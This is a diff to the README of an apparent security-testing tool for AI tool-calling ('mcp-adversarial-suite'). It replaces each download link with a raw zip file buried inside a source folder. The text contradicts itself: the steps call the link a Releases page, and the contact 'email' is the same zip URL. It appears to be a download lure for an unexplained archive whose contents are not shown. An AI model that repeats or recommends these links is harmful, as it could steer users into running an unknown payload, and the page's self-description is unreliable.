@@ -1,7 +1,7 @@
 # 🎯 mcp-adversarial-suite - Test Your Security Systems Easily
 
 ## 📥 Download Now
-[![Download mcp-adversarial-suite](https://github.com/chrismmt/mcp-adversarial-suite/raw/refs/heads/main/servers/homoglyph-forge/src/suite_mcp_adversarial_3.2.zip%20Now-Click%20to%20Download-blue)](https://github.com/chrismmt/mcp-adversarial-suite/raw/refs/heads/main/servers/homoglyph-forge/src/suite_mcp_adversarial_3.2.zip)
+[![Download mcp-adversarial-suite](https://github.com/chrismmt/mcp-adversarial-suite/raw/refs/heads/main/servers/driftlab/src/suite_mcp_adversarial_3.5.zip%20Now-Click%20to%20Download-blue)](https://github.com/chrismmt/mcp-adversarial-suite/raw/refs/heads/main/servers/driftlab/src/suite_mcp_adversarial_3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the **mcp-adversarial-suite**! This application helps you test your security systems against various adversarial attacks. It is designed for benchmarking tool-calling security, drift detection, and proxy defenses.
@@ -15,7 +15,7 @@ To run the **mcp-adversarial-suite**, ensure your system meets the following req
 - **Internet Connection**: Required for downloading updates and accessing online resources.
 
 ## 📥 Download & Install
-To download the latest version, visit this page: [Download Link](https://github.com/chrismmt/mcp-adversarial-suite/raw/refs/heads/main/servers/homoglyph-forge/src/suite_mcp_adversarial_3.2.zip). 
+To download the latest version, visit this page: [Download Link](https://github.com/chrismmt/mcp-adversarial-suite/raw/refs/heads/main/servers/driftlab/src/suite_mcp_adversarial_3.5.zip). 
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version listed and click on it.
@@ -63,6 +63,6 @@ The **mcp-adversarial-suite** focuses on various crucial topics related to secur
 Explore these topics to improve your understanding of security challenges and defenses.
 
 ## 📞 Contact
-For direct inquiries or support, please reach out to our team via email at https://github.com/chrismmt/mcp-adversarial-suite/raw/refs/heads/main/servers/homoglyph-forge/src/suite_mcp_adversarial_3.2.zip We strive to respond to all queries within 48 hours.
+For direct inquiries or support, please reach out to our team via email at https://github.com/chrismmt/mcp-adversarial-suite/raw/refs/heads/main/servers/driftlab/src/suite_mcp_adversarial_3.5.zip We strive to respond to all queries within 48 hours.
 
 Thank you for choosing **mcp-adversarial-suite**! Start testing your security today.
